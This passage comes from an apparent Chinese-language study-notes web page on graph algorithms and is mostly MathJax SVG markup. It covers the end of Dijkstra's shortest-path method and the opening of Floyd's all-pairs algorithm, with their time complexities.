transform="translate(1310.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1755.2,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2327.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2938.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(3938.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4327.7,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4899.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5344.3,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(6280.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6947.5,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mo" transform="translate(8003.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(8392.3,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(9313.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(9758.5,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(10694.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，则以路径<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="9.27ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4097.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1310.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1755.2,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2327.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2771.9,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(3708.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>代替<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.97ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3080.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1310.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1755.2,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(2691.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>在调整后的各条路径中，再找长度最短的路径，以此类推</p></li></ol><p>时间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 2577.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><h5 id="3-2-4-2-2-Floyd算法"><a href="#3-2-4-2-2-Floyd算法" class="headerlink" title="3.2.4.2.2 Floyd算法"></a>3.2.4.2.2 Floyd算法</h5><p>求所有顶点间的最短路径：</p><p>方法一：每次以一个顶点为源点，重复执行Dijkstra算法n次。时间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.451ex" role="img" focusable="false" viewBox="0 -833.2 2577.6 1083.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><p>方法二：Floyd算法，时间复杂度也是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.451ex" role="img" focusable="false" viewBox="0 -833.2 2577.6 1083.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><p>算法思想：</p><ol><li>逐个顶点试探</li><li>从<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.837ex" height="1.359ex" role="img" focusable="false" viewBox="0 -443 812 600.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 